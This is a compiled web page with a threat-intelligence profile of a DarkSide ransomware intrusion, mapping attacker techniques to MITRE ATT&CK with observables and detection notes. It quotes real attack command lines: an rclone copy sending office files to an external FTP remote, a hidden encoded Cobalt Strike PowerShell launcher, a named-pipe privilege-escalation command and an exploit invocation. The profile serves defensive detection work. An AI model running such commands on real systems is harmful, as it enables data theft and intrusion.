protocol.",(0,l.kt)("br",null),"- NamedPipe name pattern 'MSSE-","[0-9]","{4}-server' is one of the default NamedPipes used by Cobalt Strike.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1055.012"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used process injection into ",(0,l.kt)("em",{parentName:"td"},"RUNDLL32")," and ",(0,l.kt)("em",{parentName:"td"},"DLLHOST")," to launch post-exploitation tasks for Defense Evasion."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\rundll32.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\dllhost.exe")),(0,l.kt)("td",{parentName:"tr",align:null},"- RUNDLL32 is part of Windows.",(0,l.kt)("br",null),"- RUNDLL32 is used to launch functionality stored in a DLL file.",(0,l.kt)("br",null),"- RUNDLL32 without commmand-line arguments is suspicious.",(0,l.kt)("br",null),"- RUNDLL32 is default Spawn_to process for Cobalt Strike.",(0,l.kt)("br",null),"- Cobalt Strike is a post-explotaition tool widely used in attacks.",(0,l.kt)("br",null),"- Process hollowing is a method of executing arbitrary code in the address space of a separate live process.",(0,l.kt)("br",null),"- Cobalt Strike injects into temporary processes for execution.",(0,l.kt)("br",null),"- DLLHOST (a.k.a. COM Surrogate) is intented to execute DLLs.",(0,l.kt)("br",null),"- DLLHOST without commmand-line arguments is suspicious.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071",(0,l.kt)("br",null),"T1018",(0,l.kt)("br",null),"T1046",(0,l.kt)("br",null),"T1560"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"td"},"BloodHound")," in memory for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\postex_d0e7"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"SQL03.COMPANY.COM"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"#{PRIVATEIP}"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_users.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_computers.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_groups.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_ous.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_gpos.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_BloodHound.zip")),(0,l.kt)("td",{parentName:"tr",align:null},"- NamedPipe name pattern 'postex_","[a-z0-9]","{4}' is one of the default NamedPipes used by Cobalt Strike.",(0,l.kt)("br",null),"- The srcPort is high port number, eg. 63794.",(0,l.kt)("br",null),"- BloodHound is an Active Directory (AD) reconnaissance tool.",(0,l.kt)("br",null),"- BloodHound outputs results as JSON files",(0,l.kt)("br",null),"- BloodHound can collect information about the following objects (users, computers, groups, gpos)",(0,l.kt)("br",null),"- BloodHound can archive collected a ZIP file")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1140"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Windows Services")," to launch ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike PowerShell")," command via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL[REDACTED]")),(0,l.kt)("td",{parentName:"tr",align:null},"- Command-line pattern '/b /c start /b /min powershell' used by Cobalt Strike to execute its code a service.",(0,l.kt)("br",null),"- Cobalt Strike executes PowerShell command as Windows Services.",(0,l.kt)("br",null),"- Command-line patter 'powershell -nop -w hidden -encodedcommand' used by Cobalt Strike to execute PowerShell encoded commands.",(0,l.kt)("br",null),"- Cobalt Strike executes encoded PowerShell commands to load beacons shellcode into memory.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"T1134"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike"),"  Named Pipes Impersonation for Privilege Escalation."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\cmd.exe /c echo 675f2d61c15 > \\\\\\\\.\\\\pipe\\\\526c8c")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"getSystem")," is a command for Privilege Escalation available at Cobalt Strike and Meterpreter.",(0,l.kt)("br",null),"- How does it work? Meterpreter creates a Named Pipe; and creates and launch a service to run ",(0,l.kt)("em",{parentName:"td"},"cmd.exe /c echo ","[some data]"," >","\\",".\\pipe","[","random pipe here]"),". When the spawned ",(0,l.kt)("em",{parentName:"td"},"cmd.exe")," connects to Meterpreters named pipe, Meterpreter has the opportunity to impersonate that security context. Impersonation of clients is a named pipes feature. The context of the service is SYSTEM, so when you impersonate it, you become SYSTEM.",(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/"},"https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1036",(0,l.kt)("br",null),"T1567.002"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute a renamed copy of ",(0,l.kt)("em",{parentName:"td"},"rclone.exe")," for Exfiltration."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\User\\\\Public\\\\nfscsvc.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'nfscsvc copy "\\\\\\\\REDACTED" ftp2:/mnt/volume_nyc1_03/loads/REDACTED --max-age 1y --stats-one-line -P --stats 2s --ignore-existing --drive-chunk-size 512M --buffer-size=4G --transfers 20 --checkers 40 --include "*.{xls,xlsx,doc,docx,pdf})')),(0,l.kt)("td",{parentName:"tr",align:null},"- Rclone is a command line program to manage files on cloud storage. Over 40 cloud storage products support rclone including S3 object stores, business & consumer file storage services, as well as standard transfer protocols (source: rclone.org).",(0,l.kt)("br",null),"- ",(0,l.kt)("em",{parentName:"td"},"C:","\\","Users","\\","Public")," is the ",(0,l.kt)("em",{parentName:"td"},"Public")," folder in Windows. User accounts on the device have access to it. Also, network computers may have access to it, depending on network sharing settings.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011",(0,l.kt)("br",null),"T1486"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Rundll32")," to launch encryption for Impact."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe c:\\\\sources\\\\solf.dll,#3 worker1 job1-11940"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\\\README.[a-z0-9]{8}.TXT")),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"darkside-used-valid-credentials-over-rdp-for-initial-access"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"h3"},"RDP")," for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1078 - Valid Accounts")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1078"),(0,l.kt)("td",{parentName:"tr",align:null},"No details available about User Login."),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access was unclear during the time of this investigation."),(0,l.kt)("li",{parentName:"ul"},"After some time, journalists reported Initial Access via valid credentials acquired on dark web."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.newsweek.com/colonial-pipeline-hackers-used-unprotected-vpn-access-network-report-1597842"},"https://www.newsweek.com/colonial-pipeline-hackers-used-unprotected-vpn-access-network-report-1597842"))),(0,l.kt)("h3",{id:"darkside-used-valid-credentials-over-rdp-for-lateral-movement"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"h3"},"RDP")," for Lateral Movement."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Lateral Movement")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1078 - Valid Accounts")),(0,l.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1078"),(0,l.kt)("td",{parentName:"tr",align:null},"No details available about User Login."),(0,l.kt)("td",{parentName:"tr",align:null})))),(0,l.kt)("h4",{id:"notes-1"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat actor loged to multiple systems.")),(0,l.kt)("h3",{id:"darkside-used-rdp-to-download-software-tools-for-command-and-control"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to download software tools for Command And Control."),(0,l.kt)("h4",{id:"tactic-2"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-2"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer"),(0,l.kt)("li",{parentName:"ul"},"T1021.001 - Remote Services: Remote Desktop Protocol")),(0,l.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Explorer.exe dropped multiple files."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Music\\\\rembemrO.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Music\\\\perfect_x64.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Music\\\\perfect_x64.exe"))))),(0,l.kt)("h4",{id:"notes-2"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Darkside was reported to have used ",(0,l.kt)("em",{parentName:"li"},"C:","\\","Users","\\","#{user}","\\","Music","\\")," folder in other engagements.")),(0,l.kt)("h3",{id:"darkside-used-rdp-to-execute-cmd-for-execution"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to execute ",(0,l.kt)("em",{parentName:"h3"},"CMD")," for Execution."),(0,l.kt)("h4",{id:"tactic-3"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-3"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell")),(0,l.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Explorer")," opened ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe"))))),(0,l.kt)("h3",{id:"darkside-used-cmd-to-execute-a-cve-2021-27091-exploit-for-privilege-escalation"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"CMD")," to execute a CVE-2021-27091 exploit for Privilege Escalation."),(0,l.kt)("h4",{id:"tactic-4"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Privilege Escalation")),(0,l.kt)("h4",{id:"techniques-4"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1203 - Exploitation for Client Execution"),(0,l.kt)("li",{parentName:"ul"},"T1112 - Modify Registry"),(0,l.kt)("li",{parentName:"ul"},"T1543.003 - Create or Modify System Process: Windows Service")),(0,l.kt)("h4",{id:"behaviors-and-observables-4"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1203"),(0,l.kt)("td",{parentName:"tr",align:null},"Exploit (PE) for CVE-2021-27091 is executed."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"perfect_x64.exe -k Dnscache -c cmd -I"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1203"),(0,l.kt)("td",{parentName:"tr",align:null},"Exploit spawned ",(0,l.kt)("em",{parentName:"td"},"CMD")," without commandline arguments."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Exploit created ",(0,l.kt)("em",{parentName:"td"},"dll")," file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\performance_15820_14496_117.dll"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1112",(0,l.kt)("br",null),"T1543.003"),(0,l.kt)("td",{parentName:"tr",align:null},"Exploit created ",(0,l.kt)("em",{parentName:"td"},"Performance")," subkey on DNSCACHE Windows Service and provides a malicious ",(0,l.kt)("em",{parentName:"td"},"DLL")," file."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKLM\\\\SYSTEM\\\\CONTROLSET001\\\\SERVICES\\\\DNSCACHE\\\\PERFORMANCE"))))),(0,l.kt)("h4",{id:"notes-3"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"The PERFORMANCE subkey is intended to attacht a porformance monitor to the Windows service."),(0,l.kt)("li",{parentName:"ul"},"Instead of a perf monitor DLL, the exploit provides a malicious DLL for arbitrary code execution."),(0,l.kt)("li",{parentName:"ul"},"Finally, to actually get the arbitrary code to run, only need to call the performance counters.")),(0,l.kt)("h3",{id:"darkside-used-nltestexe-via-interactive-powershell-for-discovery"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"nltest.exe")," via interactive ",(0,l.kt)("em",{parentName:"h3"},"PowerShell")," for Discovery."),(0,l.kt)("h4",{id:"tactic-5"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-5"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery")),(0,l.kt)("h4",{id:"behaviors-and-observables-5"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"PowerShell interpreter launched."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\windows\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1018"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PowerShell")," spawned nltest.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\windows\\\\system32\\\\nltest.exe /dclist:yourcompany.com"))))),(0,l.kt)("h4",{id:"notes-4"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"Nltest")," is a Windows command-line utility used to list domain controllers and enumerate domain trusts."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://attack.mitre.org/software/S0359/"},"https://attack.mitre.org/software/S0359/"))),(0,l.kt)("h3",{id:"darkside-used-cobalt-strike-http-beacons-for-command-and-control"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," HTTP beacons for Command And Control."),(0,l.kt)("h4",{id:"tactic-6"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-6"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071.004 - Application Layer Protocol: Web Protocols")),(0,l.kt)("h4",{id:"behaviors-and-observables-6"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071.004"),(0,l.kt)("td",{parentName:"tr",align:null},"Sustained C2 activity."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"13[.]107.246.41"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"assets[.]outlook.com"))))),(0,l.kt)("h3",{id:"darkside-used-windows-services-for-persistence"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Windows Services")," for Persistence."),(0,l.kt)("h4",{id:"tactic-7"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Persistence")),(0,l.kt)("h4",{id:"techniques-7"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1543.003 - Create or Modify System Process: Windows Service")),(0,l.kt)("h4",{id:"behaviors-and-observables-7"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1543.003"),(0,l.kt)("td",{parentName:"tr",align:null},"created windows services."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d"))))),(0,l.kt)("h3",{id:"darkside-used-windows-services-to-launch-cobalt-strike-beacon-pe-file-for-command-and-control"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Windows Services")," to launch Cobalt Strike beacon PE file for Command And Control."),(0,l.kt)("h4",{id:"tactic-8"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-8"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1569.002 - System Services: Service Execution"),(0,l.kt)("li",{parentName:"ul"},"T1071 - Application Layer Protocol")),(0,l.kt)("h4",{id:"behaviors-and-observables-8"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002"),(0,l.kt)("td",{parentName:"tr",align:null},"PE file executed from ADMIN$ folder by services.exe."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\\\\\#{IP}\\\\ADMIN$\\\\e10a2f3.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071"),(0,l.kt)("td",{parentName:"tr",align:null},"PE file connected to default Cobalt Strike named pipe (MSSE-*)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\MSSE-5861-server"))))),(0,l.kt)("h4",{id:"notes-5"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"NamedPipes are an inter-process communication mechanism on Windows."),(0,l.kt)("li",{parentName:"ul"},"NamedPipe traffic that goes host-to-host is encapsulated within the SMB protocol."),(0,l.kt)("li",{parentName:"ul"},"NamedPipe name pattern 'MSSE-","[0-9]","{4}-server' is one of the default NamedPipes used by Cobalt Strike.")),(0,l.kt)("h3",{id:"darkside-used-process-injection-into-rundll32-and-dllhost-to-launch-post-exploitation-tasks-for-defense-evasion"},"DarkSide used process injection into ",(0,l.kt)("em",{parentName:"h3"},"RUNDLL32")," and ",(0,l.kt)("em",{parentName:"h3"},"DLLHOST")," to launch post-exploitation tasks for Defense Evasion."),(0,l.kt)("h4",{id:"tactic-9"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Defense Evasion")),(0,l.kt)("h4",{id:"techniques-9"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("li",{parentName:"ul"},"T1055.012 - Process Injection: Process Hollowing")),(0,l.kt)("h4",{id:"behaviors-and-observables-9"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},"PE file spawned RUNDLL32 without command-line arguments."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\rundll32.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1055.012"),(0,l.kt)("td",{parentName:"tr",align:null},"PE file injected 